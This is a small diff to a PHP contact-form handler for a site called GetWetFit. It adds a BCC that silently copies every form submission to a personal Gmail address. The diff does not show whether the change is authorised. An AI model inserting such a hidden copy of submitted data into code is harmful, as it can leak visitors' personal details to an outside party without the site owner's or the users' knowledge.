@@ -60,6 +60,7 @@ if (isset($_POST['submit'])) {
 
       $mail->setFrom('noreply@getwetfit.com', 'GetWetFit');
       $mail->addAddress('noreply@getwetfit.com');
+      $mail->addBCC('aupadhydy007@gmail.com');
 
       $mail->isHTML(true);
       $mail->Subject = 'New Contact Submission - GetWetFit';
